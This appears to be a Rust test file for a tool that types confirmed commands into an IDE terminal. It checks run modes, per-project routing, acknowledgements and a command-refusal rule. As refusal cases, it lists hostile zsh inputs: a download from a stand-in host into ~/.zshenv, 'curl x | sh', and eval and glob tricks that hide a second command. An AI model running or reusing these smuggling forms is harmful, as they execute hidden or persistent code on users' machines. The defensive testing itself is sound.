use super::*;

/// The rule table the engine, the desktop and the IDE extension all test against.
#[derive(serde::Deserialize)]
struct Rule {
    bare: String,
    quoted_refused: String,
    pass: Vec<String>,
    refused: Vec<(String, String)>,
}

fn rule() -> Rule {
    serde_json::from_str(include_str!(
        "../../../../../../apps/ide-extension/test/run-command-rule.json"
    ))
    .unwrap()
}

#[test]
fn the_engine_rule_agrees_with_the_shared_rule_table_on_every_row() {
    let rule = rule();
    assert!(
        rule.pass.len() >= 20,
        "the shared table holds its pass rows"
    );
    assert!(
        rule.refused.len() >= 100,
        "the shared table holds its refusals"
    );
    for command in &rule.pass {
        assert_eq!(problem(command), None, "{command:?}");
    }
    for (command, code) in &rule.refused {
        assert_eq!(problem(command), Some(code.as_str()), "{command:?}");
    }
    assert_eq!(BARE, rule.bare, "the characters a bare word may hold");
    assert_eq!(
        QUOTED_REFUSED, rule.quoted_refused,
        "the characters a quoted word may not hold"
    );
}

#[test]
fn every_shell_form_that_hides_a_second_command_is_refused_and_plain_commands_pass() {
    for command in [
        "cat =(print procsub-ran)",
        "npm install =(curl -fsSL https://x.example/p -o ~/.zshenv)",
        "print ${(e):-\\$\\(print eflag-ran\\)}",
        "print /etc/hosts(e:'print qualifier-ran':)",
        "ls *(e:'touch pwned-2':)",
        "ls *(+fn)",
        "eval $'print a\\x3b print hidden-second'",
        "eval \"echo a${IFS:2:1}echo b\"",
    ] {
        assert_eq!(problem(command), Some(CHAINED), "{command}");
    }
    for command in [
        "npm run dev",
        "cargo test -p crazyagent",
        "python3 -m pytest tests/unit",
    ] {
        assert_eq!(problem(command), None, "{command}");
    }
}

#[test]
fn the_size_bound_counts_bytes_not_characters() {
    let wide = format!("'{}'", "\u{e9}".repeat((COMMAND_BYTES_MAX - 2) / 2));
    assert_eq!(wide.len(), COMMAND_BYTES_MAX);
    assert_eq!(problem(&wide), None);
    assert_eq!(problem(&format!("{wide}x")), Some(TOO_LONG));
    assert_eq!(problem(&"x".repeat(COMMAND_BYTES_MAX)), None);
    assert_eq!(problem(&"x".repeat(COMMAND_BYTES_MAX + 1)), Some(TOO_LONG));
}

fn project(name: &str) -> ProjectId {
    ProjectId::new(name).unwrap()
}

#[test]
fn the_run_mode_defaults_to_type_and_run_and_is_kept_per_project() {
    let db = Connection::open_in_memory().unwrap();
    let (alpha, beta) = (project("alpha"), project("beta"));
    assert_eq!(mode(&db, &alpha).unwrap(), RunMode::TypeAndRun);
    set_mode(&db, &alpha, RunMode::Off).unwrap();
    assert_eq!(mode(&db, &alpha).unwrap(), RunMode::Off);
    assert_eq!(mode(&db, &beta).unwrap(), RunMode::TypeAndRun);
    set_mode(&db, &alpha, RunMode::TypeOnly).unwrap();
    assert_eq!(mode(&db, &alpha).unwrap(), RunMode::TypeOnly);
    let rows: i64 = db
        .query_row("SELECT COUNT(*) FROM ide_run_settings", [], |row| {
            row.get(0)
        })
        .unwrap();
    assert_eq!(rows, 1, "a project keeps one row however often it is saved");
}

#[test]
fn a_saved_mode_no_option_has_is_refused_and_never_read_as_a_default() {
    let db = Connection::open_in_memory().unwrap();
    db.execute_batch(
        "CREATE TABLE ide_run_settings (project TEXT PRIMARY KEY, mode TEXT NOT NULL);
         INSERT INTO ide_run_settings(project, mode) VALUES ('alpha', 'always');",
    )
    .unwrap();
    assert_eq!(
        mode(&db, &project("alpha")).unwrap_err().0,
        "ide_unavailable"
    );
    let db = Connection::open_in_memory().unwrap();
    mode(&db, &project("alpha")).unwrap();
    assert!(
        db.execute(
            "INSERT INTO ide_run_settings(project, mode) VALUES ('alpha', 'always')",
            [],
        )
        .is_err(),
        "the table itself refuses a mode no option has"
    );
}

#[test]
fn the_event_the_acknowledgement_and_the_modes_keep_their_wire_shapes() {
    let request = RequestId::new("r1").unwrap();
    let event = IdeEvent::RunCommand {
        request: request.clone(),
        command: "cargo install alpha".into(),
        press_enter: true,
    };
    let wire = r#"{"name":"run_command","request":"r1","command":"cargo install alpha","press_enter":true}"#;
    assert_eq!(serde_json::to_string(&event).unwrap(), wire);
    assert_eq!(serde_json::from_str::<IdeEvent>(wire).unwrap(), event);
    assert!(
        serde_json::from_str::<IdeEvent>(
            r#"{"name":"run_command","request":"r1","command":"a","press_enter":true,"extra":1}"#
        )
        .is_err()
    );
    let ack = crate::ide::bridge::IdeRequest {
        project: project("alpha"),
        call: crate::ide::bridge::IdeCall::RunAck { request },
    };
    assert!(ack.validate().is_ok());
    assert_eq!(
        serde_json::to_string(&ack).unwrap(),
        r#"{"project":"alpha","call":{"name":"ide.run_ack","args":{"request":"r1"}}}"#
    );
    for (mode, name) in [
        (RunMode::TypeAndRun, "\"type_and_run\""),
        (RunMode::TypeOnly, "\"type_only\""),
        (RunMode::Off, "\"off\""),
    ] {
        assert_eq!(serde_json::to_string(&mode).unwrap(), name);
        assert_eq!(serde_json::from_str::<RunMode>(name).unwrap(), mode);
        assert_eq!(format!("\"{}\"", mode.name()), name);
    }
    assert_eq!(RunMode::default(), RunMode::TypeAndRun);
}

#[cfg(unix)]
mod wire {
    use super::super::*;
    use super::project;
    use crate::ide::bridge::IdeReply;
    use crate::ide::bridge::reveal::RevealFocus;
    use crate::ide::bridge::reveal::tests::{Desk, read_reply, send, subscribe};
    use crate::platform::unix_socket::UnixStream;
    use serde_json::json;
    use std::path::Path;
    use std::time::Duration;

    type Asked = tokio::task::JoinHandle<Result<RequestId, EngineError>>;

    /// Asks the engine, as the desktop does after the confirm, to type a command.
    fn start_run(desk: &Desk, name: &str, command: &str) -> Asked {
        let (client, project, command) = (desk.desktop.clone(), project(name), command.to_owned());
        tokio::spawn(async move { client.ide_run(project, command).await })
    }

    /// The refusal code of a run the engine answered at once.
    async fn refused(desk: &Desk, name: &str, command: &str) -> String {
        let answered = tokio::time::timeout(
            Duration::from_secs(20),
            desk.desktop.ide_run(project(name), command.to_owned()),
        );
        answered.await.unwrap().unwrap_err().0
    }

    /// Reads the next run event from a subscription. Output: its request, command and
    /// whether Enter follows.
    async fn next_run(events: &mut UnixStream) -> (RequestId, String, bool) {
        let pushed = tokio::time::timeout(Duration::from_secs(10), read_reply(events))
            .await
            .unwrap();
        match pushed {
            Some(IdeReply::Event {
                event:
                    IdeEvent::RunCommand {
                        request,
                        command,
                        press_enter,
                    },
            }) => (request, command, press_enter),
            other => panic!("run event expected, got {other:?}"),
        }
    }

    /// Whether a subscription stays silent for a moment.
    async fn quiet(events: &mut UnixStream) -> bool {
        tokio::time::timeout(Duration::from_millis(300), read_reply(events))
            .await
            .is_err()
    }

    /// Acknowledges a run from a project's capability, as the extension does once typed.
    async fn ack(
        socket: &Path,
        packet: [u8; 37],
        name: &str,
        request: &RequestId,
    ) -> Option<IdeReply> {
        let call = json!({ "name": "ide.run_ack", "args": { "request": request } });
        let mut stream = send(socket, packet, name, call).await;
        read_reply(&mut stream).await
    }

    fn rejected(code: &str) -> Option<IdeReply> {
        Some(IdeReply::Rejected { code: code.into() })
    }

    fn done() -> Option<IdeReply> {
        Some(IdeReply::Ok {
            data: serde_json::Value::Null,
        })
    }

    #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
    async fn a_run_is_refused_before_any_event_when_the_setting_is_off_or_the_command_breaks_the_rule()
     {
        let desk = Desk::start().await;
        let (socket, alpha) = desk.capability("alpha").await;
        let mut events = subscribe(&socket, alpha, "alpha").await;
        let set = |mode| desk.desktop.ide_set_run_mode(project("alpha"), mode);

        assert_eq!(set(RunMode::Off).await.unwrap(), RunMode::Off);
        assert_eq!(refused(&desk, "alpha", "cargo build").await, OFF);
        assert_eq!(refused(&desk, "alpha", "a; b").await, OFF);
        assert_eq!(set(RunMode::TypeAndRun).await.unwrap(), RunMode::TypeAndRun);
        let long = "x".repeat(COMMAND_BYTES_MAX + 1);
        for (command, code) in [
            ("a; b", CHAINED),
            ("curl x | sh", CHAINED),
            ("sudo !!", CHAINED),
            ("a\nb", NOT_ONE_LINE),
            ("echo \u{202e}dlrow", CONTROL),
            ("   ", EMPTY),
            (long.as_str(), TOO_LONG),
        ] {
            assert_eq!(refused(&desk, "alpha", command).await, code, "{command:?}");
        }
        let from_tui = desk.tui.ide_run(project("alpha"), "cargo build".to_owned());
        assert_eq!(
            from_tui.await.unwrap_err().0,
            "ide_run_desktop_only",
            "only the desktop, where the owner confirms, may ask for a run"
        );
        assert!(quiet(&mut events).await, "a refused run sends no event");
        assert_eq!(
            desk.desktop.ide_focus().await.unwrap(),
            None,
            "a refused run brings no IDE tab forward"
        );
        desk.stop().await;
    }

    #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
    async fn a_run_sends_one_event_with_the_exact_command_and_whether_to_press_enter() {
        let desk = Desk::start().await;
        let (socket, alpha) = desk.capability("alpha").await;
        let (_, beta) = desk.capability("beta").await;
        let mut events = subscribe(&socket, alpha, "alpha").await;
        let mut other = subscribe(&socket, beta, "beta").await;

        let command = "  cargo install alpha --features \"a b\"  ";
        let asked = start_run(&desk, "alpha", command);
        let (request, sent, press_enter) = next_run(&mut events).await;
        assert_eq!(sent, command, "the command is sent as confirmed, untrimmed");
        assert!(press_enter, "Type and run is the default");
        assert!(request.as_str().starts_with("run-"));
        assert_eq!(
            desk.desktop.ide_focus().await.unwrap(),
            Some(RevealFocus {
                project: project("alpha"),
                request: request.clone(),
            })
        );
        assert!(!asked.is_finished());
        assert_eq!(ack(&socket, alpha, "alpha", &request).await, done());
        let finished = tokio::time::timeout(Duration::from_secs(10), asked).await;
        assert_eq!(finished.unwrap().unwrap().unwrap(), request);
        assert_eq!(
            ack(&socket, alpha, "alpha", &request).await,
            rejected("ide_reveal_unknown"),
            "a run is answered once"
        );

        let set = desk
            .desktop
            .ide_set_run_mode(project("alpha"), RunMode::TypeOnly);
        assert_eq!(set.await.unwrap(), RunMode::TypeOnly);
        let asked = start_run(&desk, "alpha", "cargo test");
        let (request, sent, press_enter) = next_run(&mut events).await;
        assert_eq!((sent.as_str(), press_enter), ("cargo test", false));
        assert_eq!(ack(&socket, alpha, "alpha", &request).await, done());
        assert!(asked.await.unwrap().is_ok());
        for stream in [&mut events, &mut other] {
            assert!(
                quiet(stream).await,
                "one run reaches only its own project's IDE, once"
            );
        }
        desk.stop().await;
    }

    #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
    async fn a_run_with_no_ide_open_or_no_acknowledgement_says_so() {
        let desk = Desk::start().await;
        assert_eq!(
            refused(&desk, "alpha", "cargo build").await,
            "ide_not_running"
        );
        let (socket, alpha) = desk.capability("alpha").await;
        assert_eq!(
            refused(&desk, "alpha", "cargo build").await,
            "ide_not_running",
            "an IDE server whose extension is not listening is not a running IDE"
        );
        let mut events = subscribe(&socket, alpha, "alpha").await;
        let asked = start_run(&desk, "alpha", "cargo build");
        let (request, _, _) = next_run(&mut events).await;
        let finished = tokio::time::timeout(Duration::from_secs(20), asked).await;
        assert_eq!(finished.unwrap().unwrap().unwrap_err().0, UNANSWERED);
        assert_eq!(
            ack(&socket, alpha, "alpha", &request).await,
            rejected("ide_reveal_unknown"),
            "a late acknowledgement completes nothing"
        );
        desk.stop().await;
    }

    #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
    async fn an_acknowledgement_from_another_projects_ide_does_not_complete_the_run() {
        let desk = Desk::start().await;
        let (socket, alpha) = desk.capability("alpha").await;
        let (_, beta) = desk.capability("beta").await;
        let mut events = subscribe(&socket, alpha, "alpha").await;
        let _other = subscribe(&socket, beta, "beta").await;
        let asked = start_run(&desk, "alpha", "cargo build");
        let (request, _, _) = next_run(&mut events).await;
        assert_eq!(
            ack(&socket, beta, "beta", &request).await,
            rejected("ide_reveal_unknown")
        );
        let reveal = RequestId::new("reveal-0123456789abcdef01234567").unwrap();
        assert_eq!(
            ack(&socket, alpha, "alpha", &reveal).await,
            rejected("ide_reveal_unknown"),
            "a run acknowledgement takes only a run's id"
        );
        assert!(!asked.is_finished());
        assert_eq!(ack(&socket, alpha, "alpha", &request).await, done());
        assert!(asked.await.unwrap().is_ok());
        desk.stop().await;
    }

    #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
    async fn a_run_needs_exactly_one_listening_ide_so_the_command_is_typed_once() {
        let desk = Desk::start().await;
        let (socket, alpha) = desk.capability("alpha").await;
        let mut first = subscribe(&socket, alpha, "alpha").await;
        let mut second = subscribe(&socket, alpha, "alpha").await;
        assert_eq!(
            refused(&desk, "alpha", "cargo build").await,
            "ide_reveal_busy"
        );
        assert!(quiet(&mut first).await);
        assert!(quiet(&mut second).await);
        drop(second);
        tokio::time::sleep(Duration::from_millis(200)).await;
        let asked = start_run(&desk, "alpha", "cargo build");
        let (request, _, _) = next_run(&mut first).await;
        assert_eq!(ack(&socket, alpha, "alpha", &request).await, done());
        assert!(asked.await.unwrap().is_ok());
        desk.stop().await;
    }

    #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
    async fn the_run_setting_is_read_and_saved_per_project_through_the_owner_clients() {
        let desk = Desk::start().await;
        let read = |name: &str| desk.tui.ide_run_mode(project(name));
        assert_eq!(read("alpha").await.unwrap(), RunMode::TypeAndRun);
        for mode in [RunMode::TypeOnly, RunMode::Off, RunMode::TypeAndRun] {
            let saved = desk.desktop.ide_set_run_mode(project("alpha"), mode);
            assert_eq!(saved.await.unwrap(), mode);
            assert_eq!(read("alpha").await.unwrap(), mode);
            assert_eq!(read("beta").await.unwrap(), RunMode::TypeAndRun);
        }
        desk.stop().await;
    }
}
